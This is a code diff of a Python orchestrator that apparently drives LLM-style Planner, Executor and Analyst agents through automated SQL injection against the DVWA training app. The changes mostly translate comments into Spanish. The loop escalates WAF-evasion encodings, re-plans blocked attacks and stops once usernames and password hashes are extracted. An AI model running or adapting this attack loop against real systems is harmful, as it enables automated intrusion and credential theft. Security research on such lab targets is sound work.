@@ -90,12 +90,12 @@ class Orchestrator:
         step = 0
 
         def next_base() -> Optional[str]:
-            """Finalise the next base payload (content), re-planning when the queue drains."""
+            # Consigue el siguiente payload base; si se agotan, el Planner propone otros
             nonlocal bases_queue, strategy, replans
             while True:
                 if bases_queue:
                     candidate = bases_queue.pop(0)
-                    crafted = self.executor.craft(level, strategy, candidate, _history(attempts), last_hint)
+                    crafted = self.executor.craft(level, strategy, candidate, _history(attempts), last_hint)  # el Executor arma el payload
                     base = str(crafted.get("payload") or candidate).strip()
                     if base:
                         return base
@@ -107,7 +107,7 @@ class Orchestrator:
                     "all attempted payloads were blocked or ineffective even after WAF evasion; "
                     "try a DIFFERENT base technique (error-based, boolean-blind, different columns)"
                 )
-                p = self.planner.plan(level, feedback=feedback)
+                p = self.planner.plan(level, feedback=feedback)  # el Planner cambia de estrategia
                 strategy = str(p.get("strategy", strategy))
                 bases_queue = [q for q in (_candidate_payload(c) for c in p.get("payloads") or []) if q]
                 say(f"[Planner] replan {replans}: {strategy}")
@@ -116,27 +116,27 @@ class Orchestrator:
 
         current_base = next_base()
         while current_base is not None and step < max_steps and (time.monotonic() - start) < timeout_seconds:
-            payload, pipeline = engine.next_payload(current_base)
-            if payload is None:  # every surface form of this base was already tried
+            payload, pipeline = engine.next_payload(current_base)   # aplica el siguiente disfraz
+            if payload is None:  # ya se probaron todos los disfraces de este payload
                 current_base = next_base()
                 continue
 
             step += 1
             surface = list(pipeline) or ["plain"]
             say(f"[Executor] step {step}: {payload!r}  [surface={surface}]")
-            response = self.dvwa.run_sqli(payload, level)
+            response = self.dvwa.run_sqli(payload, level)           # envía el payload al objetivo
 
-            if response.blocked:
+            if response.blocked:                                    # el WAF lo rechazó
                 say(f"[WAF] blocked (HTTP {response.http_status}) — escalating evasion")
                 engine.record(pipeline, payload, blocked=True)
                 attempts.append(
                     Attempt(step, payload, f"surface={surface}", response,
                             {"assessment": "WAF blocked", "next_action": "evade", "blocked": True})
                 )
-                continue  # same base, next (more aggressive) surface form
+                continue  # mismo payload, probamos un disfraz más fuerte
 
-            engine.record(pipeline, payload, blocked=False)  # this surface passes the WAF
-            analysis = self.analyst.analyze(level, payload, response)
+            engine.record(pipeline, payload, blocked=False)  # este disfraz sí pasó el WAF
+            analysis = self.analyst.analyze(level, payload, response)   # el Analyst revisa la respuesta
             attempts.append(Attempt(step, payload, f"surface={surface}", response, analysis))
             say(f"[Analyst] {analysis.get('assessment', '')} -> {analysis.get('next_action', '')}")
 
@@ -146,12 +146,12 @@ class Orchestrator:
                     {"username": r.get("first_name", ""), "hash": r.get("surname", "")}
                     for r in response.rows
                 ]
-                success = True
+                success = True                                      # se extrajeron credenciales
                 say(f"[Orchestrator] SUCCESS at step {step}")
                 break
 
             last_hint = str(analysis.get("hint", ""))
-            current_base = next_base()  # surface ok, content wrong -> new base (keeps locked pipeline)
+            current_base = next_base()  # el disfraz pasó pero el SQL falló: probamos otro payload
 
         elapsed = time.monotonic() - start
         return RunResult(
